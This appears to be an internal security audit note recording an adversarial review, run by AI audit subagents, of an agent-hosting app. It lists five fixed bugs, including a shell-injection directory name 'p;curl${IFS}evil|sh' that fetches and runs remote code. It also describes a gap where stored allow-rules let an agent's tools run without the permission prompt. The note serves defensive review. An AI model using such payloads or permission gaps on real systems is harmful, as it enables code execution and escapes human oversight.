---
title: adversarial-tester-pass-2026-07-22
scope: atlan/security
tags: [adversarial, audit, rce, ssrf, injection, fail-open, permission]
confidence: verified
source: 3 parallel read-only audit agents (brittle / injection / boundary-honesty), all fixes verified + tested
updated: 2026-07-22
---
First run of the `docs/FLEET-TESTERS.md` panel (as read-only subagents, no fleet spend). It **worked** — three agents, five real confirmed bugs, all fixed same-session, suite 173/0. Evidence that adversarial passes catch what first-try tests don't.

**Confirmed + fixed (severity order):**
1. **RCE — `build.js`** interpolated the client-supplied build path into a `bash -c` string (`cd ${projPath}`). A dir named `p;curl${IFS}evil|sh` (creatable via the app's own writeFile, or model-influenced) → arbitrary exec with the server env (holds decrypted keys). Fix: validate under `PROJECTS_DIR` (realpath prefix) + pass as `spawn` **cwd**, never shell text. Regression-tested (unit).
2. **Security gate fail-open — `preflight.js` tunnel check** (see [[dont-grep-command-output-for-presence]]). The "safe to expose?" gate reported GREEN when pgrep couldn't run and missed a normal `ngrok http`. Now fails closed.
3. **Permission-card bypass — `claudeEngine.js` (Chat) omitted `settingSources: []`.** The fleet was hardened against exactly this (accumulated `~/.claude` / `settings.local.json` allow-rules + auto-approved sandboxed Bash run tools WITHOUT hitting `canUseTool`, i.e. no card) but the interactive Chat path didn't match — so "every dangerous tool asks you first" was overstated. Fix: one line, `settingSources: []`, matching fleet/hierarchy.
4. **SSML attribute injection — `voice.js` Azure path** interpolated the request `voice` field into `name="…"` unescaped (the one input bypassing this turn's `xmlEscape`). Fix: `xmlEscape(name)`.
5. **JDK-11-reads-as-21 + broken-tmux-reads-green** (doctor.js) — same brittle-detection class, fixed.

**What held up (audited, honest):** Scout SDK-strip, preview SSRF allowlist, auth (scrypt + hashed sessions + origin pinning + revoke-on-password-change), AES-256-GCM keys, budget-halt disclosure, Bash-not-sandboxed-on-proot honesty, voice readiness. The "never claim a boundary that isn't there" rule held on the security-critical surfaces; the cracks were the two card-path overstatements (#3) + the fail-open (#2).

**Doc fixes:** README test count (11 suites), Preview "loopback" wording (was "127.0.0.1 only" but code also accepts localhost/::1).

**Method note:** run these read-only (report, don't edit), then a human/second pass confirms before promoting to `confidence: verified`. Single-agent findings stay unverified. See [[voice-provider-registry-honesty]].
